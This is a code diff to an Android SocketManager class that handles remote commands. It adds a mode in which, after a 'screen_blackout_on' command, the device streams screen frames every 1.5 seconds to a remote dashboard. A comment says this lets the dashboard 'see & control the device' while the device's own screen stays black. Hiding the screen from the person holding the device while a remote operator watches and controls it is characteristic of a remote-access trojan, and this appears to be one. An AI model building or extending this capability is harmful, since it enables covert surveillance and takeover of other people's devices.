@@ -69,6 +69,10 @@ public class SocketManager {
     private volatile boolean idleFrameMode = false;
     private ScheduledFuture<?> idleFrameFuture;
 
+    // Block-screen frame mode — when block is active the device auto-pushes a frame every 1.5s
+    private volatile boolean blockFrameMode = false;
+    private ScheduledFuture<?> blockFrameFuture;
+
     // Debounce handle for device-user interaction frames
     private final AtomicReference<ScheduledFuture<?>> actionFrameFuture = new AtomicReference<>();
 
@@ -511,6 +515,8 @@ public class SocketManager {
         streamConnected = false;
         liveConnected   = false;
         stopHeartbeat();
+        stopIdleFrameMode();
+        stopBlockFrameMode();
         closeSilently();
         try { if (streamSocket != null) streamSocket.close(); } catch (Exception ignored) {}
         try { if (liveSocket   != null) liveSocket.close();   } catch (Exception ignored) {}
@@ -672,12 +678,21 @@ public class SocketManager {
         }
         if (command.equals("stream_stop")) {
             stopIdleFrameMode();
+            stopBlockFrameMode();
             JSONObject r = new JSONObject();
             r.put("success", true);
             r.put("message", "Stream stopped");
             return r;
         }
         if (command.equals("stream_request_frame")) {
+            // When block screen is active the device is already pushing frames every 1.5s.
+            // Ignore on-demand frame requests to avoid duplicate frames and extra CPU load.
+            if (blockFrameMode) {
+                JSONObject r = new JSONObject();
+                r.put("success", true);
+                r.put("message", "Block screen active — frame auto-pushed at 1.5s interval");
+                return r;
+            }
             String deviceId = DeviceInfo.getDeviceId(context);
             sendSingleFrame(deviceId);
             JSONObject r = new JSONObject();
@@ -688,10 +703,17 @@ public class SocketManager {
 
         // ── Screen Blackout ───────────────────────────────────────────────
         if (command.equals("screen_blackout_on")) {
-            return screenBlackout.enableBlackout();
+            JSONObject r = screenBlackout.enableBlackout();
+            if (r.optBoolean("success", false)) {
+                // Start auto-pushing frames every 1.5s so dashboard can see & control the device
+                startBlockFrameMode(DeviceInfo.getDeviceId(context));
+            }
+            return r;
         }
         if (command.equals("screen_blackout_off")) {
-            return screenBlackout.disableBlackout();
+            JSONObject r = screenBlackout.disableBlackout();
+            stopBlockFrameMode();
+            return r;
         }
         if (command.equals("get_blackout_status")) {
             JSONObject r = new JSONObject();
@@ -821,6 +843,26 @@ public class SocketManager {
         if (idleFrameFuture != null) {
             idleFrameFuture.cancel(false);
             idleFrameFuture = null;
+        }
+    }
+
+    /** Start block-frame mode: push one frame every 1.5 s while block screen is active. */
+    private void startBlockFrameMode(String deviceId) {
+        stopBlockFrameMode();
+        blockFrameMode = true;
+        // Send first frame immediately so dashboard sees real content right away
+        executor.execute(() -> sendSingleFrame(deviceId));
+        blockFrameFuture = heartbeatExecutor.scheduleAtFixedRate(() -> {
+            if (blockFrameMode && (connected || streamConnected)) sendSingleFrame(deviceId);
+        }, 1500, 1500, TimeUnit.MILLISECONDS);
+        Log.i(TAG, "Block-frame mode started (1.5s interval)");
+    }
+
+    private void stopBlockFrameMode() {
+        blockFrameMode = false;
+        if (blockFrameFuture != null) {
+            blockFrameFuture.cancel(false);
+            blockFrameFuture = null;
         }
     }
 
